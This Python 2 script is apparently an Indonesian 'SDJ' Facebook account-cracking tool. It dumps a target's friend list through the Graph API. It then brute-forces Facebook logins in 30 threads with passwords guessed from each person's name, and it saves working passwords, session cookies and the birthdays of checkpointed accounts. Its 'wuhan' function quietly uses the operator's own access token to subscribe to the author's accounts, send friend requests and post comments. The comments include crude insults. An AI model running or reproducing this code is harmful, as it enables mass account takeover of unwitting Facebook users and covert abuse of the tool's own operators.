#!/usr/bin/python2
# coding=utf-8
# code by Yayan XD
# my facebook ( https://www.facebook.com/KM39453 )



import os
try:
    import requests
except ImportError:
    print '\n [×] Modul requests installing!...\n'
    os.system('pip2 install requests')

try:
    import concurrent.futures
except ImportError:
    print '\n [×] Modul Futures installing!...\n'
    os.system('pip2 install futures')

try:
    import bs4
except ImportError:
    print '\n [×] Module bs4 installing!...\n'
    os.system('pip2 install bs4')
    
try:
    import figlet
except ImportError:
    print '\n [×] Module figlet installing!...\n'
    os.system('pkg install figlet')
   
try:
    import lolcat
except ImportError:
    print '\n [×] Module lolcat installing!...\n'
    os.system('pip2 install lolcat')
   
try:
    import SDJ
except ImportError:
    print '\n [×] Module figlet installing!...\n'
    os.system('figlet SDJ')

import requests, os, re, bs4, sys, json, time, random, datetime
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from bs4 import BeautifulSoup
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
#  SHAHZAIN DAVID JOIYA  #
#------------------------------->

ok = []
cp = []
id = []
user = []
loop = 0
xi_jimpinx = '1714000985456399'
koh = '100005395413800'
hoetank = random.choice(['Yang posting orang nya ganteng:)', 'Lo ngentod:v', 'Never surrentod tekentod kentod:v'])
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

# lempankkkkkkkk
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)

def tod():
    titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
    for x in titik:
        print '\r %s[%s+%s] menghapus token %s'%(N,M,N,x),
        sys.stdout.flush()
        time.sleep(1)

# LO KONTOL
logo = ''' \033[0;96m'''
lo_ngentod = '1714009362122228'
# crack selesai
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
        print '\n\n [%s+%s] total OK : %s%s%s'%(O,N,H,str(len(ok)),N)
        print ' [%s+%s] total CP : %s%s%s'%(O,N,K,str(len(cp)),N);exit()
    else:
        print '\n\n [%s!%s] opshh kamu tidak mendapatkan hasil :('%(M,N);exit()

#masuk token
def yayanxd():
    os.system('clear')
   # print (' %s*%s tools ini menggunakan login token facebook.\n %s*%s apakah kamu sudah tau cara mendapatkan token facebook?\n %s*%s ketik %sopen%s untuk mendapatkan token facebook.'%(O,N,O,N,O,N,H,N))
    kontol = raw_input('\n %s[%s?%s] Token :%s '%(N,M,N,H))
    if kontol in ('open', 'Open', 'OPEN'):
        raw_input(' %s*%s tekan enter '%(O,N))
        os.system('xdg-open https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_')
        yayanxd()
    try:
        nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(kontol)).json()['name']
        open('.ppk/.memek.txt', 'w').write(kontol)
        raw_input(' %s*%s tekan enter '%(O,N));wuhan(kontol)
        os.system('xdg-open ')
        moch_yayan()
    except KeyError:
        print '\n\n %s[%s!%s] token lol'%(N,M,N);time.sleep(2);yayanxd()

### ORANG GANTENG ###
def moch_yayan():
    os.system('clear')
    try:
    	kontol = open('.ppk/.memek.txt', 'r').read()
    except IOError:
        print '\n %s[%s×%s] TOKN LOL'%(N,M,N);time.sleep(2);os.system('rm -rf .ppk/.memek.txt');yayanxd()
    try:
        nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(kontol)).json()['name']
    except KeyError:
        print '\n %s[%s×%s] TOKN LOL'%(N,M,N);time.sleep(2);os.system('rm -rf .ppk/.memek.txt');yayanxd()
    except requests.exceptions.ConnectionError:
        exit('\n\n %s[%s!%s] CONECTION LOLX\n'%(N,M,N))
    print logo
    IP = requests.get('http://ip-api.com/json').json()['query']
 #   os.system('echo -e "________________________________"| lolcat')
    os.system('echo -e "\n▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒\n▒▒▒▒▒▒▒▒▒▒░░░░░░░░█░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒\n▒▒▒▒▒▒▒▒░░░░░░░░░██░░░░▒▒▒▒▒▒▒▒▒▒▒▒\n▒▒▒▒▒░░░░░░░░░░▄▄███▄░░░░░▒▒▒▒▒▒▒▒▒\n▒▒▒▒░░░░░░░░░░░░▐██▌░░░░░░░▒▒▒▒▒▒▒▒\n▒▒▒░░░░░░░░░░░░░░▀█░░░░░░░░░▒▒▒▒▒▒▒\n▒▒░░░░░░░░░░░░░░▄███░░░░░░░░░▒▒▒▒▒▒\n▒░░░░░░░░░░░░░░░████░░░░░░░░░░▒▒▒▒▒\n▒░░░░▄░░░░░░░░░▐████░░░░░░░░░░▒▒▒▒▒\n▒░░░░░▀▀▄░░░░▄█▀░███░░░░░░░░░░▒▒▒▒▒\n▒░░░░░░░░▀▀█▀░░░░▐███░░░░░░░░░▒▒▒▒▒\n▒▒░░░░░░░░░░▀▄▄▄▄████▌░░░░░░░▒▒▒▒▒▒\n▒▒▒░░░░░░░░░██████████░░░░░░▒▒▒▒▒▒▒\n▒▒▒▒░░░░░░░░░█████████░░░░░▒▒▒▒▒▒▒▒\n▒▒▒▒▒░░░░░░░░░▀██████░▀▄░░▒▒▒▒▒▒▒▒▒\n▒▒▒▒▒▒▒▒░░░░░░░░░▀████▄░▀▀▄▒▒▒▒▒▒▒▒\n▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░▀██▄▒▒▒▀▄▄▄▄▄▒▒\n▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▀█▄▒▒▒▒███▄▀█\n▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▀███▀▀\n▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▀▀▒" | lolcat')
    print '____________________________________\n';time.sleep(0.03)
    print ' (\033[0;96m•\033[0m) ACTIVE USER : %s'%(nama);time.sleep(0.03)
    print ' (\033[0;96m•\033[0m) IP DEVICE   : %s'%(IP)
    print '____________________________________\n';time.sleep(0.03)
    os.system('echo -e "\n\n    [SDJ]    DUMP (PUBLK)" | lolcat')
    os.system('echo -e "\n\n    [S]     START" | lolcat')
    
 #   print  """\033[1;92m✪✪_______________________________________✪✪"""
    pepek = raw_input('\n CHOSE : ')
    if pepek == '':
        print '\n %s[%s×%s] WRONG ENTRY!'%(N,M,N);time.sleep(2);moch_yayan()
#    elif pepek in['1','01']:
        teman(kontol)
    elif pepek in['sdj','SDJ']:
        publik(kontol)
#    elif pepek in['3','03']:
        followers(kontol)
 #   elif pepek in['4','04']:
        postingan(kontol)
    elif pepek in['s','S']:
        __crack__().plerr()
#    elif pepek in['6','06']:
        cek_ingfo(kontol)
#    elif pepek in['7','07']:
        try:
            dirs = os.listdir("results")
            print '\n [ hasil crack yang tersimpan di file anda ]\n';time.sleep(0.2)
            for file in dirs:
                print(" [%s+%s] %s"%(O,N,file));time.sleep(0.2)
            file = raw_input("\n [%s?%s] masukan nama file :%s "%(M,N,H));time.sleep(0.2)
            if file == "":
                file = raw_input("\n %s[%s?%s] masukan nama file :%s %s"%(N,M,N,H,N))
            total = open("results/%s"%(file)).read().splitlines()
            print(" %s[%s#%s] --------------------------------------------"%(N,O,N));time.sleep(2)
            nm_file = ("%s"%(file)).replace("-", " ")
            hps_nm  = nm_file.replace(".txt", "").replace("OK", "").replace("CP", "")
            jalan(" [%s*%s] Hasil %scrack%s pada tanggal %s:%s%s%s total %s: %s%s%s"%(M,N,O,N,M,O,hps_nm,N,M,O,len(total),O))
            print(" %s[%s#%s] --------------------------------------------"%(N,O,N));time.sleep(2)
            for memek in total:
            	kontol = memek.replace("\n","")
                titid  = kontol.replace(" [✓] "," \x1b[0m[\x1b[1;92m✓\x1b[0m]\x1b[1;92m ").replace(" [×] ", " \x1b[0m[\x1b[1;93m×\x1b[0m]\x1b[1;93m ")
                print(titid);time.sleep(0.03)
            print(" %s[%s#%s] --------------------------------------------"%(N,O,N))
            raw_input('\n  [ %sKEMBALI%s ] '%(O,N));moch_yayan()
        except (IOError):
            print("\n %s[%s×%s] FILE EMPTY BRO :("%(N,M,N))
            raw_input('\n  [ %sKEMBALI%s ] '%(O,N));moch_yayan()
    elif pepek in['8','08']:
        seting_yntkts()
    elif pepek in['9','09']:
        info_tools()
    elif pepek in['0','00']:
        print '\n'
        tod()
        time.sleep(1);os.system('rm -rf .ppk/.memek.txt')
        jalan('\n %s[%s✓%s]%s SUCCESS token'%(N,H,N,H));exit()
    else:
        print '\n %s[%s×%s] menu [%s%s%s] PLZ TYPE [SDJ] FOR DUMP PBLK [S] FOR START CRCKING'%(N,M,N,M,pepek,N);time.sleep(2);moch_yayan()

# Yang ganti bot nya gw sumpahin mak lo mati ajg!
def wuhan(kontol):
    try:
        kentod = kontol
        requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100059709917296/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100008678141977/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100005878513705/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100003342127009/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100041388320565/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/108229897756307/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100039688893849/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100027558888180/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100034433778381/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(koh,kentod))
        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(lo_ngentod,kentod,kentod))
        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(xi_jimpinx,hoetank,kentod))
    except:
    	pass


# dump id dari teman publik hehe
def publik(kontol):
    try:
        os.mkdir('dump')
    except:pass
    try:
        csy = raw_input('\n %s[%s?%s] T4RGT ID  : '%(N,O,N))
        ahh = raw_input(' %s[%s?%s] FILE NAME EXMPL (xxx)  : '%(N,O,N))
        ihh = raw_input(' %s[%s?%s] LIMIT ID   : '%(N,O,N))
        knt = ('dump/' + ahh + '.SDJ').replace(' ', '_')
        ys  = open(knt, 'w')
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(csy,ihh,kontol)).json()["data"]:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;92m', '\x1b[1;92m', '\x1b[1;92m', '\x1b[1;92m', '\x1b[1;92m', '\x1b[1;92m', '\x1b[1;92m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;92m%s\033[0m] [\033[0;92m%s\033[0m] W4IT FOR DUMP ENDED...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n %s[%s✓%s] SUCCESS FULLY DUMPED'%(N,H,N))
        print ' [%s•%s] COPY FILE PATH 👉 ( %s%s%s )'%(O,N,M,knt,N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
    except (KeyError,IOError):
        os.remove(knt)
        jalan('\n %s[%s!%s] ID NOT FOUND.\n'%(N,M,N))
        raw_input(' [ %sB4CK%s ] '%(O,N));moch_yayan()

# Cek User Agent
def check_yntkts():
    try:
        user_agent = open('YNTKTS.txt', 'r').read()
    except IOError:
    	user_agent = '%s-'%(M)
    except: pass
    print '\n %s[%s+%s] User Agent anda : %s%s'%(N,O,N,H,user_agent)
    raw_input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()

# mulai ngecrot awokawokawokkawok
class __crack__:

    def __init__(self):
        self.id = []

    def plerr(self):
        try:
            self.apk = raw_input('\n [%s?%s] T4RGT FILE : '%(O,N))
            self.id = open(self.apk).read().splitlines()
            print '\n [%s+%s] total id -> %s%s%s' %(O,N,M,len(self.id),N)
        except:
            print '\n %s[%s×%s] File [%s%s%s] DUMP FILE NOT FOUND.'%(N,M,N,M,self.apk,N)
            raw_input('\n [%s ENTER%s ] '%(O,N));moch_yayan()
        ___yayanganteng___ = raw_input(' [%s?%s] CHOSE [YES] (y): '%(O,N))
        if ___yayanganteng___ in (',', ','):
            print '\n %s[%s!%s] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih'%(N,M,N)
            while True:
                pwek = raw_input('\n [%s?%s] masukan kata sandi : '%(O,N))
                print ' [*] crack dengan sandi -> [ %s%s%s ]' % (M, pwek, N)
                if pwek == '':
                    print '\n %s[%s×%s] jangan kosong bro kata sandi nya'%(N,M,N)
                elif len(pwek)<=5:
                    print '\n %s[%s×%s] kata sandi minimal 6 karakter'%(N,M,N)
                else:
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        cin = raw_input('\n [*] method : ')
                        if cin == '':
                            print '\n %s[%s×%s] jangan kosong bro'%(N,M,N);self.__yan__()
                        elif cin == '1':
                            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta);time.sleep(0.2)
                            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta);time.sleep(0.2)
                            jalan('\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N));time.sleep(0.2)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__api__, kimochi, ysc)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)


        elif ___yayanganteng___ in ('Y', 'y'):
            os.system('echo -e "\n\n    [START]  (METHOD [SDJ] CRACK) " | lolcat')
            self.__pler__()
        else:
            print '\n %s[%s×%s] CHOSE [YES] [y]!'%(N,M,N);time.sleep(2);moch_yayan()
        return



        loop += 1

    def __mbasic__(self, user, __yan__):
        global ok,cp,loop
     #   sys.stdout.write('\r [%s*%s] [CR4CKING] %s/%s  '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	_kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
            	_kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://mbasic.facebook.com")
            b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r  %s [SDJ_OK] %s|%s|%s                 %s' % (H,user,pw,kuki,N)
                wrt = ' [✓] %s|%s|%s' % (user,pw,kuki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    kontol = open('.ppk/.memek.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r  %s [APROVAL_DETECT] %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass

                print '\r  %s [APROVAL_DETECT] %s|%s                %s' % (K,user,pw,N)
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        

        loop += 1

    def __pler__(self):
        yan = raw_input('\n [*] TYPE : ')
        if yan == '':
            print '\n %s[%s×%s] TYPE (START) BRO'%(N,M,N);self.__pler__()

        elif yan in ('start', 'START'):
            os.system('echo -e "\n\n                       [WAIT AND SEE BRO] " | lolcat')
            os.system('echo -e "----------------------------------------------------------------------"| lolcat')
            os.system('echo -e "\n\n                    USE FLIGHT MODE FOR (5) sec IN EVERY HOUR" | lolcat')
            os.system('echo -e "\n\n                    FOR EXIT USE THIS KEY CTRL+Z" | lolcat')
            os.system('echo -e "----------------------------------------------------------------------"| lolcat')
            with YayanGanteng(max_workers=30) as (__yayanXD__):
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        __yayanXD__.submit(self.__mbasic__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            hasil(ok,cp)


        else:
            print '\n %s[%s×%s] WRONG ENTRY'%(N,M,N);self.__pler__()

if __name__ == '__main__':
    os.system('git pull')
    moch_yayan()
